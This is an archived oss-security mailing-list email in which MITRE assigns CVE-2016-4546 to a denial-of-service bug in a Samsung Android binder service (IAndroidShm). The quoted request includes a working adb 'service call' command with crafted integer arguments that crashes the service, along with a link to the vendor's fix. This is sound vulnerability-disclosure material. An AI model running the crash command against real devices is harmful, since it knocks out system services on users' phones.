X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2054" "Thursday" "5" "May" "2016" "22:39:11" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160506023911.7A4638BC1B1@smtpvmsrv1.mitre.org>" "52" "[oss-security] Re: CVE request - samsumg android phone com.samsung.android.jam.IAndroidShm binder service DoS" nil nil nil "5" "2016050602:39:11" "[oss-security] Re: CVE request - samsumg android phone com.samsung.android.jam.IAndroidShm binder service DoS" (number mark "U       cve-assign@m May  5   52/2054  " thread-indent "\"[oss-security] Re: CVE request - samsumg android phone com.samsung.android.jam.IAndroidShm binder service DoS\"\n") "<6aa8b189.1329d.1548107c1d2.Coremail.pengdawei521@163.com>" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 31903 invoked by uid 550); 6 May 2016 02:39:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31879 invoked from network); 6 May 2016 02:39:23 -0000
From: cve-assign@mitre.org
To: pengdawei521@163.com
Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
In-Reply-To: <6aa8b189.1329d.1548107c1d2.Coremail.pengdawei521@163.com>
Message-Id: <20160506023911.7A4638BC1B1@smtpvmsrv1.mitre.org>
Date: Thu,  5 May 2016 22:39:11 -0400 (EDT)
Subject: [oss-security] Re: CVE request - samsumg android phone com.samsung.android.jam.IAndroidShm binder service DoS

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> When a app send a evil data to com.samsung.android.jam.IAndroidShm
> service by service command (Android system command) , can cause to
> IAndroidShm service crash.

> adb shell;

> service call com.samsung.android.jam.IAndroidShm 5 i32 917154658 i32
> 998369275 i32 1652062893 i32 2113420870 i32 1380178743 i32 47342718
> i32 543810222 i32 1481030271

> Fix:
> http://security.samsungmobile.com/smrupdate.html#SMR-JAN-2016
> SVE-2015-5133: IAndroidShm IAPAService service DoS

>> A vulnerability without proper exception handling in system services
>> can lead to crash by calling malicious service commands.

Use CVE-2016-4546.

If you have additional reports about Samsung software, then
oss-security readers might find it useful if you include a reference
establishing that the software is open source. For example, we
selected an arbitrary Samsung repository of
git://opensource.samsung.com/SM-N900P and found a
vendor/samsung/common/external/jack/android/AndroidShm.cpp file
that may be related.

- -- 
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJXLANMAAoJEHb/MwWLVhi2150P/Rz+lyS2h7ZVm90d3Y1V2sSp
8M+zy6rN8YhjOizW2VhAWpf1U0ekDahXV9qDVmjOVxqiP5l3UXPVTb62Ee6zgYjd
fGPkYxQDMroqps42ryIg7K5eNsKGO0iZ+tsi8wfdH1wzk+opa6ta45CTqPHUl9vS
STi5sZoX2txMXCbfdcGsuudylkVG7y3FbjGw//cT7DcoHHQbWmSF7SmQwcdBzq/c
0Xl67OUOWBKFnNgrLdqifeS6Msa0YW52omLmSMOiLm9/+1jN5bCpfVrwWI78ALeG
FxfHi6HiVWZAyHPt894kCnNeynKa8uw2bWAEgy7RiHf42OBNp+15Crzdg2FvpBCa
8WXRgij1+ML7YtPbG0PfBt66rtlSpznlxp7jCeyriiKqsvSyKcS0rxVWNDbinn8g
vmApz6CqDAotB/PS4/dAv9EyvPlK/bSPiqmbYE0jDw2UmTKVrjc6DnlD0iSPgE4L
y4D6wmFLqSIljFadZVnnHqIGrdqJZQU14yWbw31Fjpp+NdKrMfG2VP/F7ZPPF1Qo
Dk+JYGurrooQwbDsEZ/6TTRXNEMfEtQRLHm7xCXzaxTFjwn12rA6jRlje0MoIPqQ
7Qtersx91679csj9cqAXlBbxgTwpFlIv5XqEcZRPiFKYK02NH/y2vyRE/2yCWkjW
pU6S7ZescwAX+GAeFsur
=GdhJ
-----END PGP SIGNATURE-----
